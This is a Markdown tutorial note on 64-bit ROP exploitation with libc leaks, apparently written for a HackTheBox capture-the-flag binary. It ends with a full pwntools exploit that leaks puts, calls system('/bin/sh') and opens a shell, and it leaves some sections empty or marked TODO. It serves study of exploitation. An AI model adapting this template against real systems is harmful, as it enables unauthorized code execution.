# ELF64 - Return-Oriented Programming (ROP) - leaks

### Overview

In 64-bit architecture, the `RIP` register is the instruction pointer register,
equivalent to the 32-bit x86 architecture's EIP register.

### Preliminary checks

###### NX and ASLR

A ROP exploit should only be used under certain circumstances, as more easier
and straightforward techniques could potentially be used to exploit a buffer
overflow vulnerability.

A ROP is needed whenever the kernel on which the binary is executed is making
use of `executable-space protection mechanisms`, preventing execution of certain
memory regions in the stack by the processor. Indeed, if the mechanism is
activated, any added shellcode in the stack through the buffer overflow
vulnerability could not be directly executed. On Linux systems, the `NX` bit
(no-execute bit) is responsible for the activation of this mechanism.

Another protection mechanism protecting against the exploitation of buffer
overflow vulnerability is the `address space layout randomization (ASLR)`. In
order to prevent reliable jumping to particular exploited function in memory,
ASLR randomly arranges the address space positions of key data areas of a
process, including the base of the executable and the positions of the stack,
heap and libraries. With `ASLR` activated it is thus not possible to jump at
the memory address of a shellcode placed in the stack or at a pre determined
function, such as `system` in the `libc`.

The technique presented in this note should only be used whenever both `NX` and
`ASLR` mechanisms are being used.

The `rabin2` utility can be used to retrieve the protection mechanisms of a
binary:

```
rabin2 -I <BINARY>
arch     x86
bits     64
canary   false
class    ELF64
endian   little
nx       true
[...]
```

###### Printing functions

In order to leak addresses in the `GOT` entry, a function printing to `stdout`
must be present in the binary. The `puts` and `write` functions can be used to
this effect.

The `objdump` Linux can be used to disassemble a binary and display the `plt`
section, which contains references to external functions called by the binary.

```
objdump -D <BINARY> | grep "puts\|write"
```    

At least one of the functions above must be present in order to conduct a ROP
exploit based on `libc` addresses leaks.

### Calculate padding

The first step is to determine the needed number of bytes to overflow
the injected buffer in order to overwrite the `rip` instruction pointer
register.

The `pattern_create.rb` and `pattern_offset.rb` ruby scripts of the
`Metasploit` framework can be used to calculate this offset.

If the binary is provided, `gdp` can be used to retrieve the value contained in
the `rsp` registry after the crash. If the binary is only accessible remotely
and can not be debugged, TODO

```
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 5000
gdb-peda$ x/g $rsp
0xXXXXXXXXXXXX: <RETURNED_PATTERN>

/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 5000 -q <RETURNED_PATTERN>
[*] Exact match at offset <RIP_OFFSET>
```

### Leak libc address

Once the padding needed to overwrite `rip` is known, the next step is to leak
the address of a `libc` function in the `GOT` table.

###### Pass argument to the printing function

On 64-bit architecture, the `rdi` register is used to pass the first argument
to the called function. A gadget popping a value from the stack into the
`rdi` register is thus needed to specify what should be printed as an argument
to the printing function.

The `r2` utility can, among others, be used to find a `pop rdi` gadget:

```
r2 <BINARY>
[0xXXXXXXXX]> /R pop rdi
0x<ADR_POP_RDI>     5f  pop rdi
0xXXXXXXX           c3  ret
```  

If the printing function takes more than one argument, gadgets to populate the
following registers must be found:
  - `%rsi` : 2nd argument ;
  - `%rdx` : 3rd argument ;
  - `%rcx` : 4th argument ;
  - `%r8` : 5th argument ;
  - `%r9` : 6th argument.

###### Printing function PLT and GOT entries

The entries in the `PLT` and `GOT` tables for the printing function must be
retrieved, which can be done by disassembling the `plt` entry of the binary
with the `objdump` Linux utility:

```
objdump -D <BINARY> | grep <PRINTING_FUNC>
<ADR_PLT>:	ff 25 32 0b 20 00    	jmpq   *0x200b32(%rip)        # <ADR_GOT> <PRINTING_FUNC@GLIBC_2.2.5>
```

###### Return to main

To continue the program execution flow after printing the `GOT` entry in
`libc`, in order to avoid the re randomization of the address space, a return
at the beginning of the program, the `main` function, is needed. It simply
consist in adding the `main` function address in the ROP chain after calling
the printing function. This mechanism is called `ret2main`.

The address of the `main` function in the `text` section can found using the
`objdump` Linux utility:

```
objdump -D <BINARY> | grep main
<0000000000ADR_MAIN> <main>:
```

### Find libc offset

### Exec payloads

### pwntools final code template

The following exploit code can be used as a template to exploit ROP buffer
overflow vulnerability with `libc` address leaks:

```
import sys
from pwn import *

context(os = "linux", arch = "amd64")

if (sys.argv[1] == "local"):
    p = process("./ropme")
    context.log_level = 'DEBUG'

elif (sys.argv[1] == "remote"):
    HOST = "docker.hackthebox.eu"
    PORT = 48016
    p = remote(HOST, PORT)

'''
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 5000
gdb-peda$ x/g $rsp
0x7fffffffe468:	0x6341356341346341
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 5000 -q 0x6341356341346341
[*] Exact match at offset 72
'''
junk = 72 * "A"

'''
r2 ropme
[0x00400530]> /R pop rdi
0x004006d3                 5f  pop rdi
0x004006d4                 c3  ret
'''
pop_rdi = p64(0x4006d3)

'''
objdump -D ropme | grep puts
4004e0:	ff 25 32 0b 20 00    	jmpq   *0x200b32(%rip)        # 601018 <puts@GLIBC_2.2.5>
'''
plt_puts = p64(0x4004e0)
got_puts = p64(0x601018)

'''
objdump -D ropme | grep main
0000000000400626 <main>:
'''
plt_main = p64(0x400626)

payload = junk + pop_rdi + got_puts + plt_puts + plt_main

p.recvuntil("dah?\n")
p.sendline(payload)
leaked_puts = p.recvline()[:-1].ljust(8, "\x00")
leaked_puts = u64(leaked_puts)
log.success("puts@GLIBC addr: 0x{:x}".format(leaked_puts))

'''
objdump -D ropme | grep "@GLIBC"
[..]
400500:	ff 25 22 0b 20 00    	jmpq   *0x200b22(%rip)        # 601028 <fgets@GLIBC_2.2.5>
'''
# got_fgets = p64(0x400500)
# payload = junk + pop_rdi + got_fgets + plt_puts + plt_main

# p.recvuntil("dah?\n")
# p.sendline(payload)
# leaked_fgets = p.recvline()[:-1].ljust(8, "\x00")
# log.success("fgets@GLIBC addr: " + leaked_fgets)

'''
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
   425: 0000000000071b00   437 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
  1417: 0000000000044bf0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
 181519 /bin/sh
'''
pop_rdi = p64(0x4006d3)
libc_puts = 0x71b00
libc_system = 0x44bf0
libc_sh = 0x181519

offset = leaked_puts - libc_puts
sys = p64(libc_system + offset)
sh = p64(libc_sh + offset)

payload = junk + pop_rdi + sh + sys

p.recvuntil("dah?\n")
p.sendline(payload)
p.interactive()
```
